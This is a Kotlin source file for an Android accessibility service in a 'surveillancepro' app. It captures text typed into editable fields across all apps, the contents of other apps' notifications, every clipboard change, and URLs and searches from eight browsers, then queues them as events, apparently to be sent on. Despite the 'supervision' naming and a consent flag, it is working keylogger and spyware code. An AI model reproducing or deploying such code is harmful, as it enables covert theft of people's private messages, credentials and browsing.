package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.content.ClipboardManager
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionAccessibilityService : AccessibilityService() {

    private var lastKeystrokeText = ""
    private var lastKeystrokePackage = ""
    private var lastKeystrokeTime = 0L

    private var lastFocusPackage = ""
    private var lastNotifText = ""

    // Buffer pour accumuler les frappes avant envoi
    private var keystrokeBuffer = ""
    private var keystrokeBufferPackage = ""
    private var keystrokeBufferStart = 0L
    private val BUFFER_FLUSH_DELAY = 3000L

    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
    private val flushRunnable = Runnable { flushKeystrokeBuffer() }

    // Clipboard
    private var lastClipText = ""
    private var lastClipTime = 0L
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null

    // Chrome URL capture
    private var lastChromeUrl = ""
    private var lastChromeUrlTime = 0L
    private val browserPackages = setOf(
        "com.android.chrome", "com.chrome.beta", "com.chrome.dev",
        "org.mozilla.firefox", "com.opera.browser", "com.brave.browser",
        "com.microsoft.emmx", "com.samsung.android.app.sbrowser",
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        startClipboardMonitor()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChanged(event)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                handleContentChanged(event)
                handleBrowserUrlCapture(event)
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> handleBrowserUrlCapture(event)
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {}
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val now = System.currentTimeMillis()

        // Si on change d'app, on flush le buffer précédent
        if (packageName != keystrokeBufferPackage && keystrokeBuffer.isNotEmpty()) {
            flushKeystrokeBuffer()
        }

        // Éviter les doublons stricts seulement (même texte exact, même app, < 500ms)
        if (text == lastKeystrokeText && packageName == lastKeystrokePackage && now - lastKeystrokeTime < 500) return

        lastKeystrokeText = text
        lastKeystrokePackage = packageName
        lastKeystrokeTime = now

        // Accumuler dans le buffer
        keystrokeBuffer = text
        keystrokeBufferPackage = packageName
        if (keystrokeBufferStart == 0L) keystrokeBufferStart = now

        // Programmer un flush après le délai d'inactivité
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, BUFFER_FLUSH_DELAY)

        // Flush immédiat si le buffer est très long (message complet probable)
        if (text.length > 200) {
            handler.removeCallbacks(flushRunnable)
            flushKeystrokeBuffer()
        }
    }

    private fun flushKeystrokeBuffer() {
        if (keystrokeBuffer.isBlank()) return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("keystroke", mapOf(
            "text" to keystrokeBuffer.take(2000),
            "app" to keystrokeBufferPackage,
            "timestamp" to timestamp,
        ))

        keystrokeBuffer = ""
        keystrokeBufferPackage = ""
        keystrokeBufferStart = 0L
    }

    private fun handleContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val source = event.source ?: return

        try {
            val editTexts = mutableListOf<AccessibilityNodeInfo>()
            findEditTexts(source, editTexts, depth = 0)

            for (node in editTexts) {
                val text = node.text?.toString() ?: continue
                if (text.isBlank()) continue

                val now = System.currentTimeMillis()
                if (text == lastKeystrokeText && packageName == lastKeystrokePackage && now - lastKeystrokeTime < 500) continue

                lastKeystrokeText = text
                lastKeystrokePackage = packageName
                lastKeystrokeTime = now

                if (packageName != keystrokeBufferPackage && keystrokeBuffer.isNotEmpty()) {
                    flushKeystrokeBuffer()
                }

                keystrokeBuffer = text
                keystrokeBufferPackage = packageName
                if (keystrokeBufferStart == 0L) keystrokeBufferStart = now

                handler.removeCallbacks(flushRunnable)
                handler.postDelayed(flushRunnable, BUFFER_FLUSH_DELAY)
            }
        } catch (_: Exception) {
        } finally {
            try { source.recycle() } catch (_: Exception) {}
        }
    }

    private fun findEditTexts(node: AccessibilityNodeInfo, results: MutableList<AccessibilityNodeInfo>, depth: Int) {
        if (depth > 15) return
        if (node.className?.toString()?.contains("EditText") == true || node.isEditable) {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findEditTexts(child, results, depth + 1)
        }
    }

    private fun handleFocusChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName == lastFocusPackage) return

        // Flush keystroke buffer quand on change d'app
        if (keystrokeBuffer.isNotEmpty()) {
            flushKeystrokeBuffer()
        }

        lastFocusPackage = packageName

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("app_focus", mapOf(
            "app" to packageName,
            "timestamp" to timestamp,
        ))
    }

    private fun handleNotification(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.joinToString(" ") ?: return
        if (text.isBlank() || text == lastNotifText) return
        lastNotifText = text

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("notification_message", mapOf(
            "app" to packageName,
            "message" to text.take(500),
            "sender" to (event.contentDescription?.toString() ?: ""),
            "source" to "accessibility",
            "timestamp" to timestamp,
        ))
    }

    // ─── CLIPBOARD MONITOR ─────────────────────────────────────────────

    private fun startClipboardMonitor() {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager ?: return
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            try {
                val clip = cm.primaryClip ?: return@OnPrimaryClipChangedListener
                if (clip.itemCount == 0) return@OnPrimaryClipChangedListener
                val text = clip.getItemAt(0).coerceToText(applicationContext)?.toString() ?: return@OnPrimaryClipChangedListener
                if (text.isBlank() || text.length > 5000) return@OnPrimaryClipChangedListener

                val now = System.currentTimeMillis()
                if (text == lastClipText && now - lastClipTime < 3000) return@OnPrimaryClipChangedListener
                lastClipText = text
                lastClipTime = now

                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
                val queue = EventQueue.getInstance(applicationContext)
                queue.enqueue("clipboard", mapOf(
                    "text" to text.take(2000),
                    "length" to text.length,
                    "timestamp" to timestamp,
                ))
            } catch (_: Exception) {}
        }
        cm.addPrimaryClipChangedListener(clipboardListener)
    }

    // ─── BROWSER URL CAPTURE ─────────────────────────────────────────────

    private fun handleBrowserUrlCapture(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName !in browserPackages) return

        val source = try { rootInActiveWindow } catch (_: Exception) { null } ?: return
        try {
            val urlBar = findUrlBar(source)
            val url = urlBar?.text?.toString() ?: return
            if (url.isBlank() || url.length < 4) return

            val now = System.currentTimeMillis()
            if (url == lastChromeUrl && now - lastChromeUrlTime < 5000) return
            lastChromeUrl = url
            lastChromeUrlTime = now

            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
            val queue = EventQueue.getInstance(applicationContext)

            val isSearch = !url.contains("://") && !url.contains(".") && url.contains(" ")
            if (isSearch) {
                queue.enqueue("chrome_search", mapOf(
                    "query" to url,
                    "engine" to "Google",
                    "browser" to readableBrowserName(packageName),
                    "timestamp" to timestamp,
                ))
            } else {
                queue.enqueue("chrome_page", mapOf(
                    "url" to if (url.startsWith("http")) url else "https://$url",
                    "title" to "",
                    "browser" to readableBrowserName(packageName),
                    "timestamp" to timestamp,
                ))
            }
        } catch (_: Exception) {
        }
    }

    private fun findUrlBar(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val urlBarIds = listOf("url_bar", "url_field", "search_box_text", "mozac_browser_toolbar_url_view", "url")
        for (id in urlBarIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId("${root.packageName}:id/$id")
            if (!nodes.isNullOrEmpty()) return nodes[0]
        }
        // Fallback: chercher un EditText avec un texte qui ressemble à une URL
        return findUrlEditText(root, 0)
    }

    private fun findUrlEditText(node: AccessibilityNodeInfo, depth: Int): AccessibilityNodeInfo? {
        if (depth > 8) return null
        if ((node.className?.toString()?.contains("EditText") == true || node.isEditable) && node.isFocusable) {
            val text = node.text?.toString() ?: ""
            if (text.contains(".") || text.contains("://")) return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findUrlEditText(child, depth + 1)
            if (result != null) return result
        }
        return null
    }

    private fun readableBrowserName(pkg: String): String = when (pkg) {
        "com.android.chrome" -> "Chrome"
        "com.chrome.beta" -> "Chrome Beta"
        "org.mozilla.firefox" -> "Firefox"
        "com.opera.browser" -> "Opera"
        "com.brave.browser" -> "Brave"
        "com.microsoft.emmx" -> "Edge"
        "com.samsung.android.app.sbrowser" -> "Samsung Internet"
        else -> pkg.substringAfterLast(".")
    }

    override fun onInterrupt() {
        flushKeystrokeBuffer()
    }

    override fun onDestroy() {
        flushKeystrokeBuffer()
        handler.removeCallbacks(flushRunnable)
        clipboardListener?.let {
            (getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager)
                ?.removePrimaryClipChangedListener(it)
        }
        super.onDestroy()
    }
}
